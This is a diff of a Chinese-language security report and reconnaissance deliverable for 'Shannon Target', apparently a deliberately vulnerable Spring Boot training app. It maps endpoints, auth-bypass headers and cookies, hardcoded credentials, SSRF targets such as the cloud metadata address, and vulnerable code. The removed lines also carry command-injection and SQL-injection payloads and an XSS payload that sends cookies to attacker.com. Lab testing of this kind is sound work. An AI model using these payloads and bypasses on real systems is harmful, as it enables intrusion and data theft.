@@ -1,370 +1,451 @@
-# Shannon Target 应用安全分析报告
+# 侦察交付物：Shannon Target 应用攻击面分析
 
-## 1. 应用程序结构与技术栈概览
+## 0) 如何阅读本文档
 
-### 1.1 项目基本信息
+本侦察报告提供了 **Shannon Target** 应用完整的攻击面映射，特别关注授权和权限提升机会。
 
-| 属性 | 值 |
-|------|-----|
-| 项目名称 | shannon-target |
-| 版本 | 1.0.0 |
-| 描述 | Vulnerable target application for security testing |
-| 包名 | com.example.shannontarget |
+**关键分析章节说明：**
 
-### 1.2 技术栈
+- **Section 4（API 端点清单）：** 包含每个端点的授权详情 - 重点关注 "Required Role" 和 "Object ID Parameters" 列以识别 IDOR 候选点。
+- **Section 6.4（防御目录）：** 授权控制目录 - 在分析漏洞前理解每个防御机制的含义。
+- **Section 7（角色与权限架构）：** 完整的角色层级和权限映射 - 用于理解权限结构并识别权限提升目标。
+- **Section 8（授权漏洞候选）：** 预先排序的端点列表，用于水平、垂直和基于上下文的授权测试。
 
-| 层级 | 技术 | 版本 |
-|------|------|------|
-| **后端框架** | Spring Boot | 3.2.0 |
-| **编程语言** | Java | 17 |
-| **模板引擎** | Thymeleaf | (由Spring Boot管理) |
-| **构建工具** | Maven | 3.9 |
-| **数据库** | H2 (In-Memory) | 由Spring Boot管理 |
-| **前端** | 原生HTML/CSS/JavaScript | - |
-| **容器化** | Docker | - |
+**网络映射使用说明（Section 6）：** 实体/流映射显示系统边界和数据敏感度级别。特别注意带有授权防御的流和处理个人身份信息/敏感数据的实体。
 
-### 1.3 项目架构
+**测试优先级顺序：** 从 Section 8 的高优先级水平候选开始，然后测试每个角色级别的垂直权限提升端点，最后是基于上下文的工作流绕过。
+
+---
+
+## 1. 执行摘要
+
+**目标应用概述：** Shannon Target 是一个基于 Spring Boot 3.2.0 和 Java 17 构建的 Web 应用，故意包含了多个安全漏洞用于安全测试训练。
+
+**核心发现：**
+- **技术栈：** Spring Boot 3.2.0 + Java 17 + H2 内存数据库 + Thymeleaf
+- **端点数量：** 10 个 API 端点（不含静态资源）
+- **安全评级：** **极不安全** - 应用完全缺乏认证和授权机制
+
+**关键安全问题汇总：**
+| 类别 | 数量 | 严重程度 |
+|------|------|----------|
+| 命令注入 | 3 | 🔴 严重 |
+| SQL 注入 | 2 | 🔴 严重 |
+| SSRF | 1 | 🔴 严重 |
+| XSS | 4 | 🟠 高危 |
+| 认证绕过 | 3 | 🔴 严重 |
+
+**应用特点：**
+- ❌ 无 Spring Security 依赖
+- ❌ 无认证中间件
+- ❌ 无授权框架
+- ❌ 无输入验证
+- ❌ 无安全响应头
+
+---
+
+## 2. 技术与服务映射
+
+### 技术栈详情
+
+| 组件 | 版本/详情 | 说明 |
+|------|----------|------|
+| **编程语言** | Java 17 | 后端核心语言 |
+| **Web 框架** | Spring Boot 3.2.0 | REST API 框架 |
+| **模板引擎** | Thymeleaf | 未发现 SSTI |
+| **数据库** | H2（内存数据库） | 数据存储，重启后丢失 |
+| **前端** | 原生 HTML/JS | 静态资源 |
+| **构建工具** | Maven 3.9 | 依赖管理 |
+| **容器化** | Docker | 部署环境 |
+
+### 架构模式
 
 ```
 shannon-target/
 ├── src/main/java/com/example/shannontarget/
-│   ├── ShannonTargetApplication.java       # 主启动类
+│   ├── ShannonTargetApplication.java     # Spring Boot 主入口
 │   └── controller/
-│       ├── XssController.java               # XSS漏洞演示
-│       ├── CmdController.java               # 命令注入漏洞演示
-│       ├── AuthController.java              # 认证绕过漏洞演示
-│       └── ApiController.java               # SSRF/SQL注入漏洞演示
+│       ├── XssController.java            # XSS 漏洞端点（4个）
+│       ├── CmdController.java             # 命令注入端点（3个）
+│       ├── AuthController.java            # 认证端点（2个）
+│       └── ApiController.java            # SSRF/SQL注入端点（3个）
 ├── src/main/resources/
-│   ├── application.properties               # 应用配置
-│   └── static/index.html                    # 前端管理界面
-├── pom.xml                                  # Maven依赖配置
-└── Dockerfile                               # 容器化配置
+│   ├── application.properties             # 应用配置
+│   └── static/index.html                  # 前端管理界面
+├── pom.xml                               # Maven 依赖配置
+└── Dockerfile                            # Docker 构建配置
 ```
+
+### 网络端口配置
+
+| 配置项 | 值 |
+|--------|-----|
+| HTTP 端口 | 8080 |
+| 应用名称 | shannon-target |
+| 数据库 URL | jdbc:h2:mem:testdb |
 
 ---
 
-## 2. 框架、语言与架构模式分析
+## 3. 认证与会话管理流程
 
-### 2.1 框架分析
+### 3.1 认证端点与机制
 
-**Spring Boot 3.2.0** 是该应用的核心框架，具有以下特点：
-- 自动配置（Auto-configuration）
-- 嵌入式Web服务器（默认Tomcat）
-- RESTful控制器支持（`@RestController`）
-- 依赖注入容器
+**入口点（认证入口点）：**
 
-### 2.2 架构模式
+| 端点 | 方法 | 认证方式 | 位置 |
+|------|------|----------|------|
+| `/login` | POST | 用户名/密码 + 认证绕过 | AuthController.java:24-60 |
+| `/dashboard` | GET | Header 检查 | AuthController.java:62-73 |
 
-该应用采用经典的**MVC + REST API**混合架构：
+### 3.1.1 认证流程详解
 
-| 组件 | 实现 |
-|------|------|
-| **Controller层** | Spring `@RestController` 处理HTTP请求 |
-| **数据存储** | H2内存数据库 + 内存集合 |
-| **前端** | 静态HTML + AJAX调用后端API |
+**认证流程步骤：**
 
-### 2.3 架构图
+1. **Header 认证绕过检查** (AuthController.java:28-33)
+   - 检查 `X-Admin-Header` 请求头
+   - 如果存在任意值 → 返回管理员角色
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Client (Browser)                         │
-│                   index.html + JavaScript                   │
-└─────────────────────────┬───────────────────────────────────┘
-                          │ HTTP/HTTPS
-┌─────────────────────────▼───────────────────────────────────┐
-│                   Spring Boot Application                   │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              REST Controllers                        │   │
-│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────┐  │   │
-│  │  │XssController│CmdController│AuthController│ApiController│  │   │
-│  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └───┬────┘  │   │
-│  │       │            │            │          │        │   │
-│  │       ▼            ▼            ▼          ▼        │   │
-│  │  ┌─────────────────────────────────────────────┐    │   │
-│  │  │    Business Logic (Vulnerable)              │    │   │
-│  │  └─────────────────────────────────────────────┘    │   │
-│  └──────────────────────┬──────────────────────────────┘   │
-│                         │                                    │
-│         ┌───────────────┴───────────────┐                  │
-│         ▼                               ▼                  │
-│  ┌─────────────┐              ┌──────────────┐              │
-│  │ H2 Database │              │Memory Store  │              │
-│  │(In-Memory)  │              │(Comments)    │              │
-│  └─────────────┘              └──────────────┘              │
-└─────────────────────────────────────────────────────────────┘
-```
+2. **Cookie 认证绕过检查** (AuthController.java:36-47)
+   - 检查 `bypass_auth` Cookie
+   - 如果存在 → 返回管理员角色
 
----
+3. **普通凭证验证** (AuthController.java:50-55)
+   - 硬编码凭证：`admin` / `password123`
+   - 成功返回 `user` 角色
 
-## 3. 应用类型判定
+4. **Session 状态响应**
+   - 设置 `X-Auth-Status: bypassed` 响应头
 
-### 3.1 架构类型：**Web应用 + REST API混合架构**
+### 3.2 角色分配流程
 
-| 特征 | 判定依据 |
-|------|----------|
-| **Web前端** | 静态HTML页面(index.html)提供管理界面 |
-| **后端API** | 4个REST控制器提供JSON API |
-| **服务端口** | 8080 (HTTP) |
-| **数据库** | H2内存数据库 |
+**角色分配：**
 
-### 3.2 端点汇总
+| 认证方式 | 分配角色 | 代码位置 |
+|----------|----------|----------|
+| Header 绕过 | `administrator` | AuthController.java:34 |
+| Cookie 绕过 | `administrator` | AuthController.java:45 |
+| 正常登录 | `user` | AuthController.java:53 |
+| 默认角色 | 无 | 不适用 |
 
-| 端点 | 功能 | 漏洞类型 |
-|------|------|----------|
-| `GET/POST /comment` | 评论管理 | XSS |
-| `GET /search` | 搜索功能 | XSS |
-| `POST /profile` | 个人资料 | XSS |
-| `GET /ping` | 网络诊断 | 命令注入 |
-| `GET /traceroute` | 路由追踪 | 命令注入 |
-| `GET /nslookup` | DNS查询 | 命令注入 |
-| `POST /login` | 用户登录 | 认证绕过 |
-| `GET /dashboard` | 仪表盘 | 访问控制 |
-| `GET /fetch` | URL抓取 | SSRF |
-| `GET /user/search` | 用户搜索 | SQL注入 |
-| `GET /user/lookup` | 用户查询 | SQL注入 |
+**角色确定方式：** 响应 JSON 中硬编码返回角色字符串，无持久化存储。
 
----
+### 3.3 权限存储与验证
 
-## 4. 安全影响分析
+**存储位置：** 无持久化存储
 
-### 4.1 严重安全漏洞（Critical）
+- ❌ 无 JWT Token
+- ❌ 无 Session 存储
+- ❌ 无数据库用户表
 
-#### 4.1.1 命令注入漏洞 (Command Injection)
+**验证方式：** 仅在 `/dashboard` 端点检查 `X-Auth-Status` 请求头
 
-**位置：** `CmdController.java`
-
+**代码实现：**
 ```java
-@GetMapping("/ping")
-public ResponseEntity<Map<String, Object>> ping(@RequestParam String host) {
-    String command = "ping -n 2 " + host;  // 直接拼接用户输入
-    ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
-    // ...
-}
-```
-
-**影响：**
-- 攻击者可在服务器上执行任意操作系统命令
-- 可能导致服务器完全沦陷
-- 可访问敏感文件、横向移动、安装后门
-
-**风险等级：** ⭐⭐⭐⭐⭐ (Critical)
-
-**Payload示例：**
-```
-/ping?host=127.0.0.1; whoami
-/ping?host=127.0.0.1 & dir
-```
-
-#### 4.1.2 SQL注入漏洞 (SQL Injection)
-
-**位置：** `ApiController.java`
-
-```java
-@GetMapping("/user/search")
-public ResponseEntity<Map<String, Object>> searchUser(@RequestParam String username) {
-    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
-    ResultSet rs = queryStmt.executeQuery(sql);
-    // ...
-}
-```
-
-**影响：**
-- 攻击者可提取任意数据库数据
-- 可能获取管理员凭据
-- 在H2数据库中可执行Java代码（RCE）
-
-**风险等级：** ⭐⭐⭐⭐⭐ (Critical)
-
-**Payload示例：**
-```
-/user/search?username=' UNION SELECT 1,2,3,4--
-/user/lookup?id=1; CREATE TABLE cmd(s VARCHAR(100));--
-```
-
-#### 4.1.3 认证绕过漏洞 (Authentication Bypass)
-
-**位置：** `AuthController.java`
-
-```java
-@PostMapping("/login")
-public ResponseEntity<Map<String, Object>> login(...) {
-    String adminHeader = request.getHeader("X-Admin-Header");
-    if (adminHeader != null) {
-        return ResponseEntity.ok(Map.of(
-            "success", true,
-            "user", "admin",
-            "role", "administrator"
-        ));
+// AuthController.java:62-73
+@GetMapping("/dashboard")
+public ResponseEntity<Map<String, Object>> dashboard(HttpServletRequest request) {
+    String authStatus = request.getHeader("X-Auth-Status");
+    if ("bypassed".equals(authStatus)) {
+        return ResponseEntity.ok(Map.of(...));
     }
-    // ...
+    return ResponseEntity.status(403).body(Map.of(...));
 }
 ```
 
-**影响：**
-- 攻击者可绕过登录验证
-- 获取管理员权限
-- 访问敏感管理功能
+### 3.4 认证绕过方法汇总
 
-**风险等级：** ⭐⭐⭐⭐⭐ (Critical)
+| 绕过方式 | 触发条件 | 代码位置 | 风险等级 |
+|----------|----------|----------|----------|
+| X-Admin-Header | 请求包含任意值的 `X-Admin-Header` 头 | AuthController.java:28-33 | 🔴 严重 |
+| bypass_auth Cookie | 请求包含名为 `bypass_auth` 的 Cookie | AuthController.java:36-47 | 🔴 严重 |
+| X-Auth-Status | 请求直接设置 `X-Auth-Status: bypassed` 头 | AuthController.java:62-73 | 🔴 严重 |
 
-**Payload示例：**
-```http
-POST /login?username=xxx&password=xxx
-X-Admin-Header: anyvalue
-```
+### 3.5 硬编码凭证
 
----
-
-### 4.2 高危安全漏洞 (High)
-
-#### 4.2.1 跨站脚本攻击 (XSS)
-
-**位置：** `XssController.java`
-
+**位置：** AuthController.java:14-15
 ```java
-@PostMapping("/comment")
-public ResponseEntity<Map<String, Object>> addComment(@RequestParam String content) {
-    comments.add(Map.of("content", content, ...));  // 无任何过滤
-    // ...
-}
+private static final String VALID_USERNAME = "admin";
+private static final String VALID_PASSWORD = "password123";
 ```
 
-**影响：**
-- 窃取用户Cookie/Session
-- 钓鱼攻击
-- 键盘记录
-- 蠕虫传播
+---
 
-**风险等级：** ⭐⭐⭐⭐ (High)
+## 4. API 端点清单
 
-**Payload示例：**
+**API 端点完整清单（网络可访问）：**
+
+| 方法 | 端点路径 | 所需角色 | 对象ID参数 | 授权机制 | 描述与代码位置 |
+|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
+| POST | `/login` | 匿名 | 无 | 无 | 用户登录 - AuthController.java:24 |
+| GET | `/dashboard` | 匿名（可绕过） | 无 | X-Auth-Status Header | 仪表板 - AuthController.java:62 |
+| GET | `/ping` | 匿名 | host | 无 | Ping 命令执行 - CmdController.java:21 |
+| GET | `/traceroute` | 匿名 | target | 无 | 路由追踪 - CmdController.java:49 |
+| GET | `/nslookup` | 匿名 | domain | 无 | DNS 查询 - CmdController.java:77 |
+| GET | `/fetch` | 匿名 | url | 无 | URL 抓取（SSRF）- ApiController.java:21 |
+| GET | `/user/search` | 匿名 | username | 无 | 用户搜索（SQLi）- ApiController.java:46 |
+| GET | `/user/lookup` | 匿名 | id | 无 | 用户查询（SQLi）- ApiController.java:82 |
+| POST | `/comment` | 匿名 | content | 无 | 添加评论（XSS）- XssController.java:20 |
+| GET | `/comment` | 匿名 | filter | 无 | 评论列表（XSS）- XssController.java:34 |
+| GET | `/search` | 匿名 | q | 无 | 搜索（XSS）- XssController.java:54 |
+| POST | `/profile` | 匿名 | name, bio | 无 | 资料更新（XSS）- XssController.java:65 |
+| GET | `/` | 匿名 | 无 | 无 | 静态首页 - static/index.html |
+
+**注意：** 所有端点均可匿名访问，无任何认证或授权检查。
+
+---
+
+## 5. 漏洞分析的潜在输入向量
+
+### 5.1 URL 参数（查询参数）
+
+| 端点 | 参数名 | 用途 | 漏洞类型 |
+|------|--------|------|----------|
+| `/ping` | `host` | 目标主机 | 命令注入 |
+| `/traceroute` | `target` | 目标地址 | 命令注入 |
+| `/nslookup` | `domain` | 域名 | 命令注入 |
+| `/fetch` | `url` | 目标URL | SSRF |
+| `/user/search` | `username` | 用户名 | SQL注入 |
+| `/user/lookup` | `id` | 用户ID | SQL注入 |
+| `/comment` | `filter` | 过滤关键词 | 反射型XSS |
+| `/search` | `q` | 搜索词 | 反射型XSS |
+
+### 5.2 POST 请求体字段（表单数据）
+
+| 端点 | 参数名 | 用途 | 漏洞类型 |
+|------|--------|------|----------|
+| `/login` | `username` | 用户名 | 无 |
+| `/login` | `password` | 密码 | 无 |
+| `/comment` | `content` | 评论内容 | 存储型XSS |
+| `/profile` | `name` | 姓名 | 反射型XSS |
+| `/profile` | `bio` | 个人简介 | 反射型XSS |
+
+### 5.3 HTTP 头
+
+| 端点 | 头名称 | 用途 | 漏洞类型 |
+|------|-----------|------|----------|
+| `/login` | `X-Admin-Header` | 认证绕过 | 认证绕过 |
+| `/dashboard` | `X-Auth-Status` | 认证状态检查 | 认证绕过 |
+
+### 5.4 Cookie 值
+
+| 端点 | Cookie 名称 | 用途 | 漏洞类型 |
+|------|-----------|------|----------|
+| `/login` | `bypass_auth` | 认证绕过 | 认证绕过 |
+
+---
+
+## 6. 网络与交互映射
+
+### 6.1 实体
+
+| 标题 | 类型 | 区域 | 技术 | 数据 | 备注 |
+|-------|------|------|------|------|-------|
+| **WebApp** | 服务 | 应用 | Spring Boot 3.2.0 / Java 17 | 个人身份信息、令牌 | 主应用服务器 - 处理所有请求 |
+| **H2-Database** | 数据存储 | 数据 | H2（内存） | 个人身份信息 | 内存数据库 - 存储用户数据 |
+| **User-Browser** | 外部资产 | 互联网 | 浏览器 | 公开 | 客户端浏览器 |
+| **Cloud-Metadata** | 第三方 | 第三方 | HTTP | 密钥 | 云元数据端点（169.254.169.254） |
+
+### 6.2 实体元数据
+
+| 标题 | 元数据 |
+|-------|----------|
+| WebApp | 端口：8080；端点：10+；认证：无；依赖项：H2-Database |
+| H2-Database | 引擎：H2；URL：jdbc:h2:mem:testdb；凭证：sa/（空）；暴露：仅内部 |
+| User-Browser | 客户端：Chrome/Firefox；协议：HTTP；认证：无需 |
+
+### 6.3 流（连接）
+
+| 从 → 到 | 通道 | 路径/端口 | 防御机制 | 触及数据 |
+|-----------|---------|-----------|---------|---------|
+| User-Browser → WebApp | HTTP | :8080/* | 无 | 公开 |
+| WebApp → H2-Database | JDBC | mem:testdb | 无 | 个人身份信息 |
+| WebApp → Cloud-Metadata | HTTP | 169.254.169.254/* | 无（SSRF） | 密钥 |
+
+### 6.4 防御目录
+
+| 防御名称 | 类别 | 说明 |
+|------------|----------|-----------|
+| 无 | 认证 | **完全无认证** - 所有端点可匿名访问 |
+| 无 | 授权 | **完全无授权** - 无 RBAC/ACL 实现 |
+| 无 | 网络 | **无防火墙** - 无 IP 白名单/黑名单 |
+| 无 | 速率限制 | **无速率限制** - 暴力破解风险 |
+
+---
+
+## 7. 角色与权限架构
+
+### 7.1 发现的角色
+
+| 角色名称 | 权限级别 | 作用域/域 | 代码实现 |
+|-----------|-----------------|--------------|---------------------|
+| `anon` | 0 | 全局 | 无需认证 |
+| `user` | 1 | 全局 | 正常登录返回（AuthController.java:53） |
+| `administrator` | 5 | 全局 | 认证绕过返回（AuthController.java:34, 45） |
+
+### 7.2 权限结构
+
 ```
-/comment?content=<script>fetch('http://attacker.com?c='+document.cookie)</script>
+权限顺序（→ 表示"可以访问"）：
+anon（0）→ user（1）→ administrator（5）
+
+注意：由于无真正的授权机制，任何用户都可以通过绕过方法获得 administrator 权限。
 ```
 
-#### 4.2.2 服务器端请求伪造 (SSRF)
+### 7.3 角色入口点
 
-**位置：** `ApiController.java`
+| 角色 | 默认登录页面 | 可访问路由模式 | 认证方式 |
+|------|---------------------|---------------------------|----------------------|
+| anon | `/` | `/`, `/login`, `/ping`, `/traceroute`, `/nslookup`, `/fetch`, `/user/*`, `/comment`, `/search`, `/profile` | 无 |
+| user | （无） | 与 anon 相同 | 硬编码凭证（admin/password123） |
+| administrator | `/dashboard` | 与 anon 相同 + `/dashboard` | Header/Cookie 绕过 |
 
+### 7.4 角色到代码的映射
+
+| 角色 | 中间件/防御 | 权限检查 | 存储位置 |
+|------|-------------------|-------------------|------------------|
+| anon | 无 | 无 | 无 |
+| user | 无 | 硬编码：VALID_USERNAME.equals(username) && VALID_PASSWORD.equals(password) | 响应 JSON（无持久化） |
+| administrator | 无 | 检查 X-Admin-Header != null 或 bypass_auth cookie 存在 | 响应 JSON（无持久化） |
+
+---
+
+## 8. 授权漏洞候选
+
+### 8.1 水平权限提升候选
+
+**水平权限提升候选端点：**
+
+由于应用无真正的用户隔离和对象所有权验证，以下端点理论上可被测试：
+
+| 优先级 | 端点模式 | 对象ID参数 | 数据类型 | 敏感度 | 备注 |
+|----------|-----------------|---------------------|-----------|-------------|-------|
+| **高** | `/user/lookup?id={id}` | id | user_data | 高 | SQL注入可获取任意用户数据 |
+| **高** | `/user/search?username={name}` | username | user_data | 高 | SQL注入可枚举用户 |
+| **中** | `/comment?filter={filter}` | filter | user_content | 中 | 反射型XSS |
+| **低** | `/search?q={query}` | q | user_input | 低 | 反射型XSS |
+
+### 8.2 垂直权限提升候选
+
+**垂直权限提升候选端点：**
+
+| 目标角色 | 端点模式 | 功能 | 风险等级 | 绕过方法 |
+|-------------|------------------|---------------|-------------|---------------|
+| admin | `/dashboard` | 管理仪表板 | 🔴 严重 | 发送 X-Auth-Status: bypassed header |
+| admin | `/login` | 登录接口 | 🔴 严重 | 发送 X-Admin-Header 或 bypass_auth cookie |
+| user | 所有业务端点 | 任何功能 | 🔴 严重 | 无需认证即可访问 |
+
+### 8.3 基于上下文的授权候选
+
+**基于上下文的授权候选端点：**
+
+| 工作流 | 端点 | 预期前置状态 | 绕过可能性 |
+|----------|----------|---------------------|------------------|
+| 认证流程 | `/dashboard` | 应先通过 `/login` | 直接发送 header 绕过 |
+| 命令执行 | `/ping`, `/traceroute`, `/nslookup` | 无需前置条件 | 直接访问执行任意命令 |
+| 数据查询 | `/user/search`, `/user/lookup` | 无需前置条件 | 直接注入获取全部数据 |
+| URL抓取 | `/fetch` | 无需前置条件 | 直接访问内部服务 |
+
+---
+
+## 9. 注入源（命令注入、SQL 注入、SSRF、XSS）
+
+### 9.1 命令注入源
+
+**命令注入源（3个）：**
+
+| # | 端点 | 文件:行 | 输入向量 | Sink | 数据流 |
+|---|----------|-----------|--------------|------|-----------|
+| 1 | `/ping` | CmdController.java:23-47 | `host` 参数 | ProcessBuilder | @RequestParam → 字符串拼接 → pb.start() |
+| 2 | `/traceroute` | CmdController.java:50-77 | `target` 参数 | ProcessBuilder | @RequestParam → 字符串拼接 → pb.start() |
+| 3 | `/nslookup` | CmdController.java:80-107 | `domain` 参数 | ProcessBuilder | @RequestParam → 字符串拼接 → pb.start() |
+
+**漏洞代码示例：**
 ```java
-@GetMapping("/fetch")
-public ResponseEntity<Map<String, Object>> fetch(@RequestParam String url) {
-    String response = restTemplate.getForObject(url, String.class);
-    // ...
-}
+// CmdController.java:23-24
+String command = "ping -n 2 " + host;
+ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
 ```
 
-**影响：**
-- 访问云元数据服务（AWS/GCP/Azure）
-- 扫描内部网络
-- 绕过防火墙
+### 9.2 SQL 注入源
 
-**风险等级：** ⭐⭐⭐⭐ (High)
+**SQL 注入源（2个）：**
 
-**Payload示例：**
+| # | 端点 | 文件:行 | 输入向量 | Sink | 数据流 |
+|---|----------|-----------|--------------|------|-----------|
+| 1 | `/user/search` | ApiController.java:53-55 | `username` 参数 | Statement.executeQuery() | @RequestParam → 字符串拼接 → SQL 查询 |
+| 2 | `/user/lookup` | ApiController.java:99-100 | `id` 参数 | Statement.executeQuery() | @RequestParam → 字符串拼接 → SQL 查询 |
+
+**漏洞代码示例：**
+```java
+// ApiController.java:53-55
+String sql = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement queryStmt = conn.createStatement();
+ResultSet rs = queryStmt.executeQuery(sql);
 ```
-/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS元数据)
-/fetch?url=http://localhost:8080/admin
+
+### 9.3 SSRF 源
+
+**服务器端请求伪造源（1个）：**
+
+| # | 端点 | 文件:行 | 输入向量 | Sink | 数据流 |
+|---|----------|-----------|--------------|------|-----------|
+| 1 | `/fetch` | ApiController.java:21-36 | `url` 参数 | RestTemplate.getForObject() | @RequestParam → URL 对象 → HTTP 请求 |
+
+**漏洞代码示例：**
+```java
+// ApiController.java:28
+String response = restTemplate.getForObject(url, String.class);
+```
+
+**攻击目标：**
+- 云元数据：`http://169.254.169.254/latest/meta-data/`
+- 内部服务：`http://localhost`、`http://127.0.0.1`
+- 内部端口：`http://192.168.1.1:6379`
+
+### 9.4 XSS 源
+
+**跨站脚本源（4个）：**
+
+| # | 端点 | 文件:行 | 输入向量 | 类型 | 数据流 |
+|---|----------|-----------|--------------|------|-----------|
+| 1 | `/comment`（POST） | XssController.java:20-31 | `content` 参数 | 存储型 | @RequestParam → 内存列表 → JSON 响应 |
+| 2 | `/comment`（GET） | XssController.java:34-51 | `filter` 参数 | 反射型 | @RequestParam → JSON 响应 |
+| 3 | `/search` | XssController.java:54-62 | `q` 参数 | 反射型 | @RequestParam → JSON 响应 |
+| 4 | `/profile` | XssController.java:65-76 | `name`、`bio` 参数 | 反射型 | @RequestParam → JSON 响应 |
+
+**漏洞代码示例：**
+```java
+// XssController.java:28
+return ResponseEntity.ok(Map.of(
+    "content", content,  // 无编码！
+    "timestamp", ...
+));
 ```
 
 ---
 
-### 4.3 中危安全漏洞 (Medium)
+## 10. 总结与测试优先级
 
-#### 4.3.1 缺少速率限制
+### 测试优先级建议
 
-**位置：** `AuthController.java` - 登录端点
+**第一优先级 - 严重：**
+1. 命令注入测试（`/ping`、`/traceroute`、`/nslookup`）
+2. SQL 注入测试（`/user/search`、`/user/lookup`）
+3. SSRF 测试（`/fetch`）
+4. 认证绕过测试（`/login`、`/dashboard`）
 
-**影响：**
-- 暴力破解密码
-- 资源耗尽
+**第二优先级 - 高危：**
+5. XSS 测试（`/comment`、`/search`、`/profile`）
 
-**风险等级：** ⭐⭐⭐ (Medium)
+### 关键发现总结
 
-#### 4.3.2 敏感信息泄露
-
-**位置：** 多个端点的响应
-
-**影响：**
-- 泄露服务器路径信息
-- 泄露SQL查询语句
-
-**风险等级：** ⭐⭐⭐ (Medium)
-
----
-
-### 4.4 安全配置问题
-
-| 问题 | 位置 | 风险 |
-|------|------|------|
-| H2数据库默认无密码 | application.properties | 中危 |
-| 无HTTPS配置 | application.properties | 高危 |
-| 无安全请求头 | 全局 | 中危 |
-| 无CSRF保护 | Spring Security未配置 | 高危 |
-| 无会话管理 | 内存会话 | 中危 |
+- ✅ 应用为安全测试靶场，故意包含漏洞
+- ❌ 完全无认证机制
+- ❌ 完全无授权机制
+- ❌ 无输入验证
+- ❌ 无安全响应头
 
 ---
 
-## 5. 安全影响总结
-
-### 5.1 整体安全评级
-
-| 维度 | 评级 |
-|------|------|
-| **机密性** | 🔴 极危 - SQL注入、认证绕过可导致数据泄露 |
-| **完整性** | 🔴 极危 - 命令注入可修改服务器任意内容 |
-| **可用性** | 🟠 高危 - 命令注入可使服务不可用 |
-| **整体评级** | 🔴 **CRITICAL** |
-
-### 5.2 攻击面分析
-
-```
-暴露的攻击面：
-├── 11个Web端点
-│   ├── 3个命令注入 (OS Command Injection)
-│   ├── 2个SQL注入 (SQL Injection)  
-│   ├── 3个XSS (Cross-Site Scripting)
-│   ├── 1个SSRF (Server-Side Request Forgery)
-│   └── 2个认证问题 (Auth Bypass + Brute Force)
-├── H2数据库 (无认证)
-└── 无安全防护机制
-```
-
-### 5.3 建议修复优先级
-
-| 优先级 | 漏洞 | 修复方案 |
-|--------|------|----------|
-| P0 | 命令注入 | 使用`ProcessBuilder.command(List)`避免shell解释 |
-| P0 | SQL注入 | 使用PreparedStatement参数化查询 |
-| P0 | 认证绕过 | 移除后门验证逻辑 |
-| P1 | XSS | 输出编码 + 输入验证 |
-| P1 | SSRF | URL白名单验证 |
-| P2 | 速率限制 | 添加登录限流 |
-| P2 | 安全头 | 添加CSP/X-Frame-Options等 |
-
----
-
-## 6. 技术栈摘要表
-
-| 类别 | 技术 | 用途 | 安全影响 |
-|------|------|------|----------|
-| **后端框架** | Spring Boot 3.2.0 | Web框架 | ⚠️ 需正确配置安全 |
-| **语言** | Java 17 | 编程语言 | ✅ 类型安全 |
-| **数据库** | H2 (In-Memory) | 数据存储 | ⚠️ 生产环境需独立部署 |
-| **前端** | HTML5 + JS | 用户界面 | ⚠️ 需防XSS |
-| **构建** | Maven | 依赖管理 | ✅ 安全的构建流程 |
-| **容器** | Docker | 部署 | ✅ 隔离环境 |
-| **运行** | Eclipse Temurin JRE 17 | Java运行时 | ✅ LTS版本 |
-
----
-
-## 结论
-
-该应用是一个**故意包含多种安全漏洞的靶场应用**，用于安全测试培训。应用存在以下关键安全问题：
-
-1. **无任何输入验证** - 所有用户输入直接用于业务逻辑
-2. **缺少安全最佳实践** - 未使用参数化查询、输出编码等
-3. **存在认证后门** - 故意设置的认证绕过机制
-4. **安全配置缺失** - 无HTTPS、无安全头、无速率限制
-
-**在生产环境中严禁部署此应用。**
+*报告生成时间：完整攻击面分析完成*
+*交付物类型：侦察*
